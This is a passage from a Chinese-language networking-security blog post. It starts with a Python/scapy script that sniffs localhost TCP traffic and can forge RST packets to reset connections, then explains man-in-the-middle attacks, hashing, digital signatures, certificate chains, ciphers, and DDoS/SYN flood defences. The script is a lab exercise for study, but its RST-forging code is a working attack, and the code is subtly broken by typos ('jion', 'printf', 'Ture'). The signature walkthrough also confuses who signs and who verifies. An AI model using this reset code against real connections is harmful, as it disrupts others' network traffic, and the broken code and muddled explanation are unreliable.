class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ifaddr</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">DEFAULT_WINDOW_SIZE = <span class="number">2052</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In order for this attack to work on Linux, we must</span></span><br><span class="line"><span class="comment"># use L2RawSocket, which under the hood sets up the socket</span></span><br><span class="line"><span class="comment"># to use the PF_IINET &quot;domain&quot;. This is required because of the</span></span><br><span class="line"><span class="comment"># way localhost works on Linux.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See https://scapy.readthedocs.io/en/latest/troubleshooting.html#i-can-t-ping-127-0-0-1-scapy-does-not-work-with-127-0-0-1-or-on-the-loopback-interface for more details</span></span><br><span class="line">conf.L3socket = L3RawSocket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">msg, params=&#123;&#125;</span>):</span></span><br><span class="line">    formatted_params = <span class="string">&quot; &quot;</span>.jion([<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=&quot;</span>v<span class="string">&quot; for k,v in params.items()])</span></span><br><span class="line"><span class="string">    printf(f&quot;</span>&#123;msg&#125; &#123;formatted_params&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def is_adapter_localhost(adapter, localhost_ip):</span></span><br><span class="line"><span class="string">    return len([ip for ip in adapter.ips if ip.ip == localhost_ip]) &gt; 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def is_packet_on_tcp_conn(server_ip, server_port, client_ip):</span></span><br><span class="line"><span class="string">    def f(p):</span></span><br><span class="line"><span class="string">        return (</span></span><br><span class="line"><span class="string">            is_packet_tcp_server_to_client(server_ip, server_port, client_ip)(p) or</span></span><br><span class="line"><span class="string">            is_packet_tcp_client_to_server(server_ip, server_port, client_ip)(p)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    return f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):</span></span><br><span class="line"><span class="string">    def f(p):</span></span><br><span class="line"><span class="string">        if not p.haslayer(TCP):</span></span><br><span class="line"><span class="string">            return False</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        src_ip = p[IP].src</span></span><br><span class="line"><span class="string">        src_port = p[TCP].sport</span></span><br><span class="line"><span class="string">        dst_ip = p[IP].dst</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return src_ip == server_ip and src_port == server_port and dst_ip == client_ip</span></span><br><span class="line"><span class="string">    return f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):</span></span><br><span class="line"><span class="string">    def f(p):</span></span><br><span class="line"><span class="string">        if not p.haslayer(TCP):</span></span><br><span class="line"><span class="string">            return False</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        src_ip = p[IP].src</span></span><br><span class="line"><span class="string">        dst_ip = p[IP].dst</span></span><br><span class="line"><span class="string">        dst_port = p[TCP].dport</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return src_ip == client_ip and dst_ip == server_ip and dst_port == server_port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def send_reset(iface, seq_jitter=0, ignore_syn=Ture):</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span> Set seq_jitter to be non_zero <span class="keyword">in</span> order to prove to yourself that the</span><br><span class="line">    sequence number of a RST segment does indeed need to be exactly equal</span><br><span class="line">    to the last sequence number ACK-ed by the receiver</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    def f(p):</span></span><br><span class="line"><span class="string">        src_ip = p[IP].src</span></span><br><span class="line"><span class="string">        src_port = p[TCP].sport</span></span><br><span class="line"><span class="string">        dst_ip = p[IP].dst</span></span><br><span class="line"><span class="string">        dst_port = p[TCP].dport</span></span><br><span class="line"><span class="string">        seq = p[TCP].seq</span></span><br><span class="line"><span class="string">        ack = p[TCP].ack</span></span><br><span class="line"><span class="string">        flags = p[TCP].flags</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        log(</span></span><br><span class="line"><span class="string">            &quot;Grabbed packet&quot;,</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;src_ip&quot;: src_ip,</span></span><br><span class="line"><span class="string">                &quot;dst_ip&quot;: dst_ip,</span></span><br><span class="line"><span class="string">                &quot;src_port&quot;: src_port,</span></span><br><span class="line"><span class="string">                &quot;dst_port&quot;: dst_port,</span></span><br><span class="line"><span class="string">                &quot;seq&quot;: seq,</span></span><br><span class="line"><span class="string">                &quot;ack&quot;: ack,</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        if &quot;S&quot; in flags and ignore_syn:</span></span><br><span class="line"><span class="string">            print(&quot;Packet has SYN flag, not sending RST&quot;)</span></span><br><span class="line"><span class="string">            return</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        # Don&#x27;t allow a -ve seq</span></span><br><span class="line"><span class="string">        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)</span></span><br><span class="line"><span class="string">        if jitter == 0:</span></span><br><span class="line"><span class="string">            print(&quot;jitter == 0, this RST packet should close the connection&quot;)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        rst_seq = ack + jitter</span></span><br><span class="line"><span class="string">        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags=&quot;R&quot;, window=DEFAULT_WINDOW_SIZE, seq=rst_seq)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        log(</span></span><br><span class="line"><span class="string">            &quot;Sending RST packet...&quot;,</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;orig_ack&quot;: ack,</span></span><br><span class="line"><span class="string">                &quot;jitter&quot;: jitter,</span></span><br><span class="line"><span class="string">                &quot;seq&quot;: rst_seq,   </span></span><br><span class="line"><span class="string">            &#125;,</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        send(p, verbose=0, iface=iface)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    return f</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">def log_packet(p):</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>This prints a big pile of debug information. We could make a prettier</span><br><span class="line">    log function <span class="keyword">if</span> we wanted.<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    return p.show()</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">if __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="string">    localhost_ip = &quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="string">    local_ifaces = [</span></span><br><span class="line"><span class="string">        adapter.name for adapter in ifaddr.get_adapters()</span></span><br><span class="line"><span class="string">        if is_adapter_localhost(adapter, localhost_ip)</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    iface = local_ifaces[0]</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    localhost_server_port = 8000</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    log(&quot;Starting sniff...&quot;)</span></span><br><span class="line"><span class="string">    t = sniff(</span></span><br><span class="line"><span class="string">        iface=iface,</span></span><br><span class="line"><span class="string">        count=50,</span></span><br><span class="line"><span class="string">        # NOTE: uncomment `send_reset` to run the reset attack instead of</span></span><br><span class="line"><span class="string">        # simply logging the packet.</span></span><br><span class="line"><span class="string">        # prn=send_reset(iface),</span></span><br><span class="line"><span class="string">        prn=log_packet,</span></span><br><span class="line"><span class="string">        lfilter=is_packet_tcp_client_to_server(localhost_ip, localhost_server_port, localhost_ip))</span></span><br><span class="line"><span class="string">    log(&quot;Finished sniffing!&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p><em>iface</em>: 告诉scapy在<code>lo0</code>（localhost）网络接口上进行监听；<br><em>lfilter</em>：这是个过滤器，告诉scapy忽略所有不属于指定的TCP连接（通信双方皆为loalhost，且端口号位8000）的数据包<br><em>prn</em>：scapy通过这个函数来操作所有符合lfilter规则的数据包。上面的例子只是将数据包打印到终端，下文将会修改函数来伪造重置报文。<br><em>count</em>:scapy函数返回之前要嗅探的数据包数量。 </p>
+<h4 id="发送伪造的重置报文"><a href="#发送伪造的重置报文" class="headerlink" title="发送伪造的重置报文"></a>发送伪造的重置报文</h4><p>下面开始修改程序，发送伪造的TCP重置报文来进行TCP重置攻击。根据上面的解读，只需要修改prn函数就行了。让其检查数据包，提取必要参数，并利用这些参数来伪造TCP重置报文并发送。</p>
+<p>例如，假设该程序截获了一个从（src_ip, src_port)发往（dst_ip, dst_port）的报文段，该报文段的ACK标志已置为1，ACK号位100，000。攻击程序接下来要做的是：</p>
+<ul>
+<li>由于伪造的数据包时对截获的数据包的响应，所以伪造数据包的源 IP/Port 应该是截获数据包的目的 IP/Port，反之亦然。</li>
+<li>将伪造数据包的<code>RST</code>标志位置为1，以表示这是一个重置报文。</li>
+<li>将伪造数据包的序列号设置为截获数据包的ACK号，因为这是发送方期望收到的下一个序列号。</li>
+<li>调用<code>scapy</code>的send方法，将伪造的数据包发送给截获数据包的发送方。</li>
+</ul>
+<h4 id="进一步实验"><a href="#进一步实验" class="headerlink" title="进一步实验"></a>进一步实验</h4><p>1、可以继续使用攻击程序进行世延，将伪造数据包的序列号加减1，看会发生什么，是不是确实需要和截获数据包的ACK完全相同。<br>2、打开Wireshark，监听lo0网络接口，并使用过滤器ip.src == 127.0.0.1 &amp; amp; ip.dst == 127.0.0.1 &amp; amp; &amp;<br>tcp.port == 8000来过滤无关数据。可以看到TCP连接的所有细节。<br>3、在连接上更快速的发送数据流，使攻击更难执行。</p>
+<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>猪八戒要向小蓝表白，于是写了一封信给小蓝，结果第三者小黑拦截到了这封信，把这封信进行了篡改，于是乎在他们之间进行搞破坏行动。这个马文才就是中间人，实施的就是中间人攻击。好我们继续聊聊什么是中间人攻击。</p>
+<h4 id="什么是中间人"><a href="#什么是中间人" class="headerlink" title="什么是中间人"></a>什么是中间人</h4><p>攻击中间人攻击英文名叫 Man-in-the-MiddleAttack，简称「MITM攻击」。指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方 直接对话，但事实上整个会话都被攻击者完全控制。我们画一张图：<br>[中间人攻击1]（中间人攻击1.png）</p>
+<h4 id="中间人攻击原理"><a href="#中间人攻击原理" class="headerlink" title="中间人攻击原理"></a>中间人攻击原理</h4><p>举个例子，我和公司签了一个一份劳动合同，一人一份合同。不晓得哪个可能改了合同内容，不知道真假了，怎么搞？只好找专业的机构来鉴定，自然就要花钱。</p>
+<p>在安全领域有句话：<em>我们没有办法杜绝网络犯罪，只好想办法提高网络犯罪的成本。既然没法杜绝这种情况，那我们就想办法提高作案的成本</em>，今天我们就简单了解下基本的网络安全知识，也是面试中的高频面试题了。</p>
+<p>为了避免双方说活不算数的情况，双方引入第三家机构，将合同原文给可信任的第三方机构，只要这个机构不监守自盗，合同就相对安全。</p>
+<h4 id="如果第三方机构内部不严格或容易出现纰漏"><a href="#如果第三方机构内部不严格或容易出现纰漏" class="headerlink" title="如果第三方机构内部不严格或容易出现纰漏"></a>如果第三方机构内部不严格或容易出现纰漏</h4><p>虽然我们将合同原文给第三方机构了，为了防止内部人员的更改，需要采取什么措施呢</p>
+<p>一种可行的办法是引入摘要算法。即合同和摘要一起，为了简单的理解摘要。大家可以想象这个摘要为一个函数，这个函数对原文进行了加密，会产生一个唯一的散列值，一旦原文发生一点点变化，那么这个散列值将会变化。</p>
+<h4 id="常用的摘要算法"><a href="#常用的摘要算法" class="headerlink" title="常用的摘要算法"></a>常用的摘要算法</h4><p>目前比较常用的加密算法有消息摘要算法和安全散列算法(SHA)。MD5 是将任意长度的文章转化为一个128位的散列值，可是在2004年，MD5 被证实了容易发生碰撞，即两篇原文产生相同的摘要。这样的话相当于直接给黑客一个后门，轻松伪造摘要。</p>
+<p>所以在大部分的情况下都会选择SHA算法。</p>
+<h4 id="出现内鬼了怎么办？"><a href="#出现内鬼了怎么办？" class="headerlink" title="出现内鬼了怎么办？"></a>出现内鬼了怎么办？</h4><p>看似很安全的场面了，理论上来说杜绝了篡改合同的做法。主要某个员工同时具有修改合同和摘要的权利，那搞事儿就是时间的问题了，毕竟没哪个系统可以完全的杜绝员工接触敏感信息，除非敏感信息都不存在。所以能不能考虑将合同和摘要分开存储呢</p>
+<h4 id="那如何确保员工不会修改合同呢"><a href="#那如何确保员工不会修改合同呢" class="headerlink" title="那如何确保员工不会修改合同呢"></a>那如何确保员工不会修改合同呢</h4><p>这确实蛮难的，不过办法总比困难多。我们将合同放在双方手中，摘要放在第三方机构，篡改难度进一步加大。</p>
+<h4 id="那么员工万一和某个用户串通好了呢"><a href="#那么员工万一和某个用户串通好了呢" class="headerlink" title="那么员工万一和某个用户串通好了呢"></a>那么员工万一和某个用户串通好了呢</h4><p>看来放在第三方的机构还是不好使，同样存在不小风险。所以还需要寻找新的方案，这就出现了数字签名和证书。</p>
+<h4 id="数字证书和签名"><a href="#数字证书和签名" class="headerlink" title="数字证书和签名"></a>数字证书和签名</h4><p>同样的，举个例子。Sum 和 Mike 两个人签合同。Sum 首先用 SHA 算法计算合同的摘要，然后用自己私钥将摘要加密，得到数字签名。Sum 将合同原文、签名，以及公钥三者都交给 Mike<br><a href="%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E5%92%8C%E7%AD%BE%E5%90%8D.png">数字证书和签名</a></p>
+<p>如果 Sum 想要证明合同是 Mike 的，那么就要使用 Mike  的公钥，将这个签名解密得到摘要x，然后Mike 计算原文的sha摘要Y，随后对比x和y，如果两者相等，就认为数据没有被篡改</p>
+<p>在这样的过程中，Mike 是不能更改 Sum 的合同，因为要修改合同不仅仅要修改原文还要修改摘要，修改摘要需要提供Mike 的私钥，私钥即 Sum 独有的密码，公钥即 Sum 公布给他人使用的密码</p>
+<p>总之，公钥加密的数据只能私钥可以解密。私钥加密的数据只有公钥可以解密，这就是非对称加密</p>
+<h4 id="对称与非对称加密"><a href="#对称与非对称加密" class="headerlink" title="对称与非对称加密"></a>对称与非对称加密</h4><p>隐私保护？不是吓唬大家，信息是透明的兄die，不过尽量去维护个人的隐私吧，今天学习对称加密和非对称加密。<br>大家先读读这个字”钥”,是读”yao”，我以前也是，其实读”yue”</p>
+<h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><p>对称加密，顾名思义，加密方与解密方使用同一钥匙(秘钥)。具体一些就是，发送方通过使用相应的加密算法和秘钥，对将要发送的信息进行加密；对于接收方而言，使用解密算法和相同的秘钥解锁信息，从而有能力阅读信息。<br><a href="%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86.png">对称加密</a></p>
+<h4 id="常见的对称加密算法"><a href="#常见的对称加密算法" class="headerlink" title="常见的对称加密算法"></a>常见的对称加密算法</h4><p>DES<br>DES使用的密钥表面上是64位的，然而只有其中的56位被实际用于算法，其余8位可以被用于奇偶校验，并在算法中被丢弃。因此，DES 的有效密钥长度为56位，通常称 DES 的密钥长度为56位。假设秘钥为 56 位，采用暴力破Jie的方式，其秘钥个数为2的56次方，那么每纳秒执行一次解密所需要的时间差不多1年的样子。当然，没人这么干。DES 现在已经不是一种安全的加密方法，主要因为它使用的56位密钥过短。</p>
+<p>IDEA<br>国际数据加密算法(International Data Encryption Algorithm)。秘钥长度128位，优点没有专利的限制。</p>
+<p>AES<br>当DES被破解以后，没过多久推出了 AES 算法，提供了三种长度供选择，128 位、192 位和 256，为了保证性能不受太大的影响，选择128即可。</p>
+<p>SM1和SM4<br>之前几种都是国外的，我们国内自行研究了国密 **SM1 **和 SM4。其中S都属于国家标准，算法公开。优点就是国家的大力支持和认可</p>
+<h4 id="非对称算法"><a href="#非对称算法" class="headerlink" title="非对称算法"></a>非对称算法</h4><p>在对称加密中，发送方与接收方使用相同的秘钥。那么在非对称加密中则是发送方与接收方使用的不同的秘钥。其主要解决的问题是防止在秘钥协商的过程中发生泄漏。比如在对称加密中，小蓝将需要发送的消息加密，然后告诉你密码是123balala,ok,对于其他人而言，很容易就能劫持到密码是123balala。那么在非对称的情况下，小蓝告诉所有人密码是123balala,对于中间人而言，拿到也没用，因为没有私钥。所以，非对称密钥其实主要解决了密钥分发的难题。如下图<br><a href="%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">非对称加密</a></p>
+<p>其实我们经常都在使用非对称加密，比如使用多台服务器搭建大数据平台hadoop，为了方便多台机器设置免密登录，是不是就会涉及到秘钥分发。再比如搭建docker集群也会使用相关非对称加密算法。</p>
+<h4 id="常见的非对称加密"><a href="#常见的非对称加密" class="headerlink" title="常见的非对称加密"></a>常见的非对称加密</h4><p>RSA（RSA 加密算法，RSA Algorithm）<br>优势是性能比较快，如果想要较高的加密难度，需要很长的秘钥。<br>ECC<br>基于椭圆曲线提出。是目前加密强度最高的非对称加密算法<br>SM2<br>同样基于椭圆曲线问题设计。最大优势就是国家认可和大力支持。<br><a href="%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%862.png">非对称加密2</a></p>
+<p>散列算法<br>这个大家应该更加熟悉了，比如我们平常使用的MD5校验，在很多时候，我并不是拿来进行加密，而是用来获得唯一性ID。在做系统的过程中，存储用户的各种密码信息，通常都会通过散列算法，最终存储其散列值。</p>
+<p>常见的散列<br>MD5<br>MD5 可以用来生成一个 128 位的消息摘要，它是目前应用比较普遍的散列算法，具体的应用场景你可以自行  参阅。虽然，因为算法的缺陷，它的唯一性已经被破解了，但是大部分场景下，这并不会构成安全问题。但是，如果不是长度受限（32 个字符），我还是不推荐你继续使用 MD5 的。<br>SHA<br>安全散列算法。**SHA **分为 SHA1 和 SH2 两个版本。该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。</p>
+<p>SM3<br>国密算法SM3。加密强度和SHA-256想不多。主要是收到国家的支持。</p>
+<p><a href="%E6%95%A3%E5%88%97%E7%AE%97%E6%B3%95.png">散列算法</a><br>至此，总结下，大部分情况下使用对称加密，具有比较不错的安全性。如果需要分布式进行秘钥分发，考虑非对称。如果不需要可逆计算则散列算法。因为这段时间有这方面需求，就看了一些这方面的资料，入坑信息安全，就怕以后洗发水都不用买。谢谢大家查看！</p>
+<h4 id="问题还有，此时如果-Sum-否认给过-Mike-的公钥和合同，不久gg了"><a href="#问题还有，此时如果-Sum-否认给过-Mike-的公钥和合同，不久gg了" class="headerlink" title="问题还有，此时如果 Sum 否认给过 Mike 的公钥和合同，不久gg了"></a>问题还有，此时如果 Sum 否认给过 Mike 的公钥和合同，不久gg了</h4><p>所以需要 Sum 过的话做过的事儿需要足够的信誉，这就引入了第三方机构和证书机制。</p>
+<p>证书之所以会有信用，是因为证书的签发方拥有信用。所以如果 Sum 想让 Mike 承认自己的公钥，Sum 不会直接将公钥给 Mike ，而是提供由第三方机构，含有公钥的证书。如果 Mike 也信任这个机构，法律都认可，那ik，信任关系成立<br><a href="%E7%AC%AC%E4%B8%89%E6%96%B9%E8%AE%A4%E8%AF%81%E6%9C%BA%E6%9E%84.png">第三方认证机构</a></p>
+<p>如上图所示，Sum 将自己的申请提交给机构，产生证书的原文。机构用自己的私钥签名 Sum 的申请原文（先根据原文内容计算摘要，再用私钥加密），得到带有签名信息的证书。Mike 拿到带签名信息的证书，通过第三方机构的公钥进行解密，获得 Sum 证书的摘要、证书的原文。有了 Sum 证书的摘要和原文，Mike 就可以进行验签。验签通过，Mike 就可以确认 Sum 的证书的确是第三方机构签发的。</p>
+<p>用上面这样一个机制，合同的双方都无法否认合同。这个解决方案的核心在于需要第三方信用服务机构提供信用背书。这里产生了一个最基础的信任链，如果第三方机构的信任崩溃，比如被黑客攻破，那整条信任链条也就断裂了</p>
+<p>为了让这个信任条更加稳固，就需要环环相扣，打造更长的信任链，避免单点信任风险</p>
+<p><a href="%E8%AE%A4%E8%AF%81%E9%93%BE.png">认证链</a></p>
+<p>上图中，由信誉最好的根证书机构提供根证书，然后根证书机构去签发二级机构的证书；二级机构去签发三级机构的证书；最后有由三级机构去签发 Sum 证书。</p>
+<p>如果要验证 Sum 证书的合法性，就需要用三级机构证书中的公钥去解密 Sum 证书的数字签名。</p>
+<p>如果要验证三级机构证书的合法性，就需要用二级机构的证书去解密三级机构证书的数字签名。</p>
+<p>如果要验证二级结构证书的合法性，就需要用根证书去解密。</p>
+<p>以上，就构成了一个相对长一些的信任链。如果其中一方想要作弊是非常困难的，除非链条中的所有机构同时联合起来，进行欺诈。</p>
+<h4 id="中间人攻击如何避免"><a href="#中间人攻击如何避免" class="headerlink" title="中间人攻击如何避免?"></a>中间人攻击如何避免?</h4><p>既然知道了中间人攻击的原理也知道了他的危险，现在我们看看如何避免。相信我们都遇到过下面这种状况：<br><a href="%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%9B%BE.png">中间人攻击图</a><br>出现这个界面的很多情况下，都是遇到了中间人攻击的现象，需要对安全证书进行及时地监测。而且大名鼎鼎的github网站，也曾遭遇过中间人攻击：</p>
+<p>想要避免中间人攻击的方法目前主要有两个：</p>
+<p>客户端不要轻易相信证书：因为这些证书极有可能是中间人。</p>
+<p>App 可以提前预埋证书在本地：意思是我们本地提前有一些证书，这样其他证书就不能再起作用了。</p>
+<h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><p>通过上面的描述，总之即好多种攻击都是 DDOS 攻击，所以简单总结下这个攻击相关内容。</p>
+<p>其实，像全球互联网各大公司，均遭受过大量的 DDoS。</p>
+<p>2018年，GitHub 在一瞬间遭到高达 1.35Tbps 的带宽攻击。这次 DDoS 攻击几乎可以堪称是互联网有史以来规模最大、威力最大的 DDoS 攻击了。在 GitHub 遭到攻击后，仅仅一周后，DDoS 攻击又开始对 Google、亚马逊甚至 Pornhub 等网站进行了 DDoS 攻击。后续的 DDoS 攻击带宽最高也达到了 1Tbps。</p>
+<h4 id="那-DDoS-攻击究竟是什么？"><a href="#那-DDoS-攻击究竟是什么？" class="headerlink" title="那 DDoS 攻击究竟是什么？"></a>那 DDoS 攻击究竟是什么？</h4><p>DDos 全名 Distributed Denial of Service，翻译成中文就是分布式拒绝服务。指的是处于不同位置的多个攻击者同时向一个或数个目标发动攻击，是一种分布的、协同的大规模攻击方式。单一的DoS攻击一般是采用一对一方式的，它利用网络协议和操作系统的一些缺陷，采用欺骗和伪装的策略来进行网络攻击，使网站服务器充斥大量要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷以至于瘫痪而停止提供正常的网络服务。</p>
+<h5 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h5><p>我开了一家有五十个座位的重庆火锅店，由于用料上等，童叟无欺。平时门庭若市，生意特别红火，而对面二狗家的火锅店却无人问津。二狗为了对付我，想了一个办法，叫了五十个人来我的火锅店坐着却不点菜，让别的客人无法吃饭。</p>
+<p>上面这个例子讲的就是典型的 DDoS 攻击，一般来说是指攻击者利用“肉鸡”对目标网站在较短的时间内发起大量请求，大规模消耗目标网站的主机资源，让它无法正常服务。在线游戏、互联网金融等领域是 DDoS 攻击的高发行业。</p>
+<p>攻击方式很多，比如 ICMP Flood、UDP Flood、NTP Flood、SYN Flood、CC 攻击、DNS Query Flood等等</p>
+<h4 id="SYN-Flood进行DDoS攻击的实现原理"><a href="#SYN-Flood进行DDoS攻击的实现原理" class="headerlink" title="SYN Flood进行DDoS攻击的实现原理**"></a>SYN Flood进行DDoS攻击的实现原理**</h4><p>SYN Flood 是一种利用 TCP 协议缺陷，发送大量伪造的 TCP 连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式。</p>
+<p>一次正常的建立 TCP 连接，需要三次握手：客户端发送 SYN 报文，服务端收到请求并返回报文表示接受，客户端也返回确认，完成连接。</p>
+<p>SYN Flood 就是用户向服务器发送报文后突然死机或掉线，那么服务器在发出应答报文后就无法收到客户端的确认报文（第三次握手无法完成），这时服务器端一般会重试并等待一段时间后再丢弃这个未完成的连接。</p>
+<p>一个用户出现异常导致服务器的一个线程等待一会儿并不是大问题，但恶意攻击者大量模拟这种情况，服务器端为了维护数以万计的半连接而消耗非常多的资源，结果往往是无暇理睬客户的正常请求，甚至崩溃。从正常客户的角度看来，网站失去了响应，无法访问。</p>
+<h3 id="如何应对-DDoS-攻击？"><a href="#如何应对-DDoS-攻击？" class="headerlink" title="如何应对 DDoS 攻击？"></a>如何应对 DDoS 攻击？</h3><ul>
+<li>高防服务器<br>还是拿开的重庆火锅店举例，高防服务器就是我给重庆火锅店增加了两名保安，这两名保安可以让保护店铺不受流氓骚扰，并且还会定期在店铺周围巡逻防止流氓骚扰。</li>
+</ul>
+<p>高防服务器主要是指能独立硬防御 50Gbps 以上的服务器，能够帮助网站拒绝服务攻击，定期扫描网络主节点等，这东西是不错，就是贵~</p>
+<ul>
+<li><p>黑名单<br>面对火锅店里面的流氓，我一怒之下将他们拍照入档，并禁止他们踏入店铺，但是有的时候遇到长得像的人也会禁止他进入店铺。这个就是设置黑名单，此方法秉承的就是“错杀一千，也不放一百”的原则，会封锁正常流量，影响到正常业务。</p>
+</li>
+<li><p>DDoS 清洗<br>DDos 清洗，就是我发现客人进店几分钟以后，但是一直不点餐，我就把他踢出店里。</p>
+</li>
+</ul>
+<p>DDoS 清洗会对用户请求数据进行实时监控，及时发现 <strong>DOS</strong> 攻击等异常流量，在不影响正常业务开展的情况下清洗掉这些异常流量。</p>
+<ul>
+<li>CDN 加速<br>CDN 加速，我们可以这么理解：为了减少流氓骚扰，我干脆将火锅店开到了线上，承接外卖服务，这样流氓找不到店在哪里，也耍不来流氓了。</li>
+</ul>
+<p>在现实中，CDN 服务将网站访问流量分配到了各个节点中，这样一方面隐藏网站的真实 IP，另一方面即使遭遇 DDoS 攻击，也可以将流量分散到各个节点中，防止源站崩溃。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/network/" rel="tag"># network</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/03/13/network/iptables/iptables-log/" rel="prev" title="iptables-log">
+                  <i class="fa fa-chevron-left"></i> iptables-log
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Liu liu</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
